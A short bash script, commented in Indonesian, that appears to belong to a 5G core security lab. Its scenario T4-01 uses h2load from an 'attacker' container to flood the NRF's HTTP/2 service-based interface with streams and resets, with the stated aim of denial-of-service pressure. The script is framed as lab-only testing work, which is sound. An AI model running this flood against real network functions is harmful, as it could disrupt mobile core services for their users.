#!/usr/bin/env bash
# Tier 4 — SBI HTTP/2 (over TLS) dari attacker ke NF SBI. VulDB #626122; Positive Tech.
#   bash scenarios/tier4_sbi/run_tier4.sh [all|T4-01]
set -euo pipefail
cd "$(dirname "$0")/../.."
RS="scripts/run_scenario.sh"
NRF="172.22.0.20"; SRC="172.22.0.50"; OK="--i-understand-lab-only"
docker compose up -d attacker >/dev/null 2>&1 || docker start attacker >/dev/null 2>&1 || true
sleep 3
# T4-01: churn HTTP/2 (banyak stream, RST) ke SBI NRF over TLS → tekanan DoS (SMF/NRF)
run_T4_01() { bash "$RS" 4 T4-01 sbi_http2_dos "$SRC" "$NRF" SBI 20 $OK -- \
  docker exec attacker h2load -n 200000 -c 40 -m 100 --duration=15 "https://$NRF:7777/"; }
WHICH="${1:-all}"
case "$WHICH" in all|T4-01) run_T4_01 ;; *) echo "tak dikenal: $1"; exit 2 ;; esac
echo "== Tier 4 selesai =="
